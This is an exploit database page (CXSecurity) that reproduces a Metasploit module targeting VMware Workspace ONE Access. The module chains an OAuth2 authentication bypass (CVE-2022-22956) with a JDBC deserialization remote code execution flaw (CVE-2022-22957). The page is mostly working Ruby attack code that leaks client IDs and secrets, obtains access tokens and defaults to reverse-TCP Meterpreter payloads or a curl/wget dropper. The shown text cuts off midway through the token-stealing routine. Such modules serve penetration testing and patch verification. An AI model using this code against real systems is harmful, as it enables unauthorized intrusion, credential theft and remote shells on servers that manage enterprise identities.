---
title: Mware Workspace ONE Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023040061
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-19
fetch_date: 2025-10-04T11:31:53.234572
---

# Mware Workspace ONE Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Mware Workspace ONE Remote Code Execution** **2023.04.18**  Credit:  **[mr\_me](https://cxsecurity.com/author/mr_me/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-22956](https://cxsecurity.com/cveshow/CVE-2022-22956/ "Click to see CVE-2022-22956")** | **[CVE-2022-22957](https://cxsecurity.com/cveshow/CVE-2022-22957/ "Click to see CVE-2022-22957")** | **[CVE-2022-22960](https://cxsecurity.com/cveshow/CVE-2022-22960/ "Click to see CVE-2022-22960")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Exploit::EXE
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HttpServer
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
class InvalidRequest < StandardError
end
class InvalidResponse < StandardError
end
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'VMware Workspace ONE Access VMSA-2022-0011 exploit chain',
'Description' => %q{
This module combines two vulnerabilities in order achieve remote code execution in the context of the
`horizon` user. The first vulnerability CVE-2022-22956 is an authentication bypass in
OAuth2TokenResourceController ACS which allows a remote, unauthenticated attacker to bypass the
authentication mechanism and execute any operation. The second vulnerability CVE-2022-22957 is a JDBC
injection RCE specifically in the DBConnectionCheckController class's dbCheck method which allows an attacker
to deserialize arbitrary Java objects which can allow remote code execution.
},
'Author' => [
'mr\_me', # Discovery & PoC
'jheysel-r7' # Metasploit Module
],
'References' => [
['CVE', '2022-22956'],
['CVE', '2022-22957'],
['URL', 'https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution'],
['URL', 'https://github.com/sourceincite/hekate/'],
['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0011.html']
],
'DisclosureDate' => '2022-04-06',
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD, ARCH\_X64],
'Privileged' => false,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse\_tcp'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X64],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => %i[curl wget],
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp'
}
}
]
],
'Payload' => {
'BadChars' => "\x22"
},
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true,
'LPORT' => 5555
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
end
# The VMware products affected do no expose any version information to unauthenticated users.
# Attempt to exploit the auth bypass to determine if the target is vulnerable. Both the auth bypass and RCE were
# patched in the following VMware update: https://kb.vmware.com/s/article/88099
def check
@token = get\_authentication\_token
Exploit::CheckCode::Vulnerable('Successfully by-passed authentication by exploiting CVE-2022-22956')
rescue InvalidRequest, InvalidResponse => e
return Exploit::CheckCode::Safe("There was an error exploiting the authentication by-pass vulnerability (CVE-2022-22956): #{e.class}, #{e}")
end
# Exploit OAuth2TokenResourceController ACS Authentication Bypass (CVE-2022-22956).
#
# Return the authentication token
def get\_authentication\_token
oauth\_client = ['Service\_\_OAuth2Client', 'acs'].sample
res\_activation\_token = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, 'SAAS', 'API', '1.0', 'REST', 'oauth2', 'generateActivationToken', oauth\_client),
'method' => 'POST'
})
unless res\_activation\_token
raise InvalidRequest, 'No response from the server when requesting an activation token'
end
unless res\_activation\_token.code == 200 && res\_activation\_token.headers['content-type'] == 'application/json;charset=UTF-8'
raise InvalidResponse, "Unexpected response code:#{res\_activation\_token.code}, when requesting an activation token"
end
activation\_token = res\_activation\_token.get\_json\_document['activationToken']
res\_client\_info = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, 'SAAS', 'API', '1.0', 'REST', 'oauth2', 'activate'),
'method' => 'POST',
'Content-Type' => 'application/x-www-form-urlencoded',
'data' => activation\_token
})
unless res\_client\_info
raise InvalidRequest, 'No response from client when sending the activation token and expecting client info in return'
end
unless res\_client\_info.code == 200 && res\_client\_info.headers['content-type'] == 'application/json;charset=UTF-8'
raise InvalidResponse, "Unexpected response code:#{res\_client\_info.code}, when sending the activation token and expecting client info in return"
end
json\_client\_info = res\_client\_info.get\_json\_document
client\_id = json\_client\_info['client\_id']
client\_secret = json\_client\_info['client\_secret']
print\_good("Leaked client\_id: #{client\_id}")
print\_good("Leaked client\_secret: #{client\_secret}")
post\_data = "grant\_type=client\_credentials&client\_id=#{client\_id}&client\_secret=#{client\_secret}"
res\_access\_token = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, 'SAAS', 'auth', 'oauthtoken'),
'method' => 'POST',
'Content-Type' => 'application/x-www-form-urlencoded',
'data' => post\_data
})
unless res\_access\_token
raise InvalidRequest, 'No response from the server when requesting the access token'
end
unless res\_access\_token.code == 200 && res\_access\_token.headers['content-type'] == 'application/json;charset=UTF-8' && res\_access\_token.get\_json\_document['access\_token']
raise InvalidResponse, 'Invalid response from the server when requesting the acc...